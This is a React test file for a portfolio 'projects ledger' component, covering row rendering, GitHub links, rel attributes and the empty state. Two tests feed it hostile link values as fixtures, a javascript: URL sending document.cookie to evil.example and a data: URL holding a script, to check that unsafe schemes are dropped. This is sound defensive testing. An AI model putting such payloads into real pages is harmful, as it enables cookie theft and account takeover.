import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { ProjectIndex } from '@/components/projects/project-index';
import type { Project } from '@/lib/api/types';

/**
 * Behavioural coverage for the projects ledger.
 *
 * The assertions follow the DES-001 row anatomy and the acceptance criteria it
 * serves: every project is one ruled row with a single wrapping anchor on its
 * primary link (AC-10), a project without a repository renders no GitHub link
 * and no placeholder standing in for one (AC-11), the GitHub anchor is never
 * nested inside the wrapping anchor, and a zero-project listing renders the
 * designed empty state pointing readers at the writing.
 *
 * The scheme assertions cover SEC-4: the links are API-supplied, React renders
 * a `javascript:` href rather than blocking it, so anything outside http(s) has
 * to be dropped here.
 */

const projects: Project[] = [
  {
    id: '5f0f7d2a-1f4e-4f3a-9a3d-0c9c0f2b1a01',
    name: 'subagents-dev',
    description:
      'A Claude Code plugin that turns a written spec into a reviewed, tested changeset.',
    primary_link: 'https://subagents.dev',
    github_link: 'https://github.com/psauerborn/subagents-dev',
  },
  {
    id: '5f0f7d2a-1f4e-4f3a-9a3d-0c9c0f2b1a02',
    name: 'Helix event platform',
    description:
      'Client platform carrying 40k events a second with exactly-once consumer semantics.',
    primary_link: 'https://psauerborn.dev/blog/helix',
    github_link: null,
  },
];

describe('ProjectIndex', () => {
  it('renders the name and description of every project', () => {
    render(<ProjectIndex projects={projects} />);

    for (const project of projects) {
      expect(
        screen.getByRole('heading', { name: project.name }),
      ).toBeInTheDocument();
      expect(screen.getByText(project.description)).toBeInTheDocument();
    }
  });

  it('renders one anchor per project targeting its primary link', () => {
    render(<ProjectIndex projects={projects} />);

    for (const project of projects) {
      expect(screen.getByRole('link', { name: project.name })).toHaveAttribute(
        'href',
        project.primary_link,
      );
    }
  });

  it('renders the GitHub link of a project that has a repository', () => {
    render(<ProjectIndex projects={[projects[0]]} />);

    expect(
      screen.getByRole('link', { name: /subagents-dev on GitHub/i }),
    ).toHaveAttribute('href', 'https://github.com/psauerborn/subagents-dev');
  });

  it('omits the GitHub link and any placeholder when github_link is null', () => {
    const { container } = render(<ProjectIndex projects={[projects[1]]} />);

    expect(screen.queryByText(/github/i)).not.toBeInTheDocument();
    expect(container.querySelectorAll('a')).toHaveLength(1);
  });

  it('renders the GitHub anchor outside the wrapping primary anchor', () => {
    render(<ProjectIndex projects={projects} />);

    const primary = screen.getByRole('link', { name: 'subagents-dev' });
    const github = screen.getByRole('link', {
      name: /subagents-dev on GitHub/i,
    });

    expect(primary.contains(github)).toBe(false);
  });

  it('renders no anchor for a project whose primary link is not http(s)', () => {
    const hostile: Project = {
      ...projects[0],
      primary_link: "javascript:fetch('https://evil.example/'+document.cookie)",
      github_link: null,
    };

    const { container } = render(<ProjectIndex projects={[hostile]} />);

    expect(container.querySelectorAll('a')).toHaveLength(0);
    // The row still reads as a row: the name and description are rendered as
    // plain text rather than the project disappearing from the ledger.
    expect(
      screen.getByRole('heading', { name: hostile.name }),
    ).toBeInTheDocument();
    expect(screen.getByText(hostile.description)).toBeInTheDocument();
  });

  it('renders no GitHub anchor when the repository link is not http(s)', () => {
    const hostile: Project = {
      ...projects[0],
      github_link: 'data:text/html;base64,PHNjcmlwdD48L3NjcmlwdD4=',
    };

    const { container } = render(<ProjectIndex projects={[hostile]} />);

    expect(container.querySelectorAll('a')).toHaveLength(1);
    expect(
      screen.queryByRole('link', { name: /on GitHub/i }),
    ).not.toBeInTheDocument();
  });

  it('marks the external anchors rel="noopener noreferrer"', () => {
    render(<ProjectIndex projects={[projects[0]]} />);

    for (const link of screen.getAllByRole('link')) {
      expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    }
  });

  it('renders the empty state linking to the writing when there are no projects', () => {
    render(<ProjectIndex projects={[]} />);

    expect(screen.getByRole('heading', { level: 2 })).toHaveTextContent(
      /no projects/i,
    );
    expect(screen.getByRole('link', { name: /blog|writing/i })).toHaveAttribute(
      'href',
      '/blog',
    );
    expect(screen.queryByRole('list')).not.toBeInTheDocument();
  });
});
